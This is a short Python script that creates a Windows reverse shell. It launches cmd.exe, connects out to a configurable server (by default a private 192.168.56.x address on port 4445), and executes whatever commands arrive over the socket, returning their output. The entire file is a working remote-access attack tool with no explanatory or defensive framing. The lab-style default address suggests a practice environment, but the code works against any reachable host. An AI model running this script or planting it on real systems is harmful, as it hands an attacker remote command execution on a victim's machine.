import subprocess
import socket
import re
import sys
import argparse

HOST = '192.168.56.102'
PORT = '4445'

##############################################################################
#   Class Definitions                                                        # 
##############################################################################

class InteractiveCommand():
	""" Sets up an interactive session with a process and uses prompt to
	determine when input can be passed into the command."""
	
	def __init__(self, process, prompt):
		self.process = subprocess.Popen( process, shell=True, 
				stdin=subprocess.PIPE, stdout=subprocess.PIPE, 
				stderr=subprocess.STDOUT )
		
		self.prompt  = prompt
		self.wait_for_prompt()

	def wait_for_prompt(self):
		output = ""
		while not self.prompt.search(output):
			c = self.process.stdout.read(1)
			if c == "":	break
			output += c

		# Now we're at a prompt; return the output
		return output

	def command(self, command):
		self.process.stdin.write(command + "\n")
		return self.wait_for_prompt()


##############################################################################
#   Function Definitions                                                     # 
##############################################################################

def usage():
	print("shell.py server port")
	sys.exit()


##############################################################################
#    MAIN PROGRAM                                                            #
##############################################################################

#Parse command line arguments using argparse
parser = argparse.ArgumentParser(description="Create a reverse shell.")
parser.add_argument('-s', action='store', default=HOST, metavar='server',
                    help='IP address of server accepting reverse connection')
parser.add_argument('-p', action='store', default=PORT, metavar='port',
                    help='Listening port on server.')
args = parser.parse_args()

	
cp = InteractiveCommand("cmd.exe", re.compile(r"^C:\\.*>", re.M))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((args.s, int(args.p)))
sock.send("[*] Connection recieved.")

while True:
	data = sock.recv(1024).strip()
	if data == 'quit': break
	res = cp.command(data)
	sock.send(res)
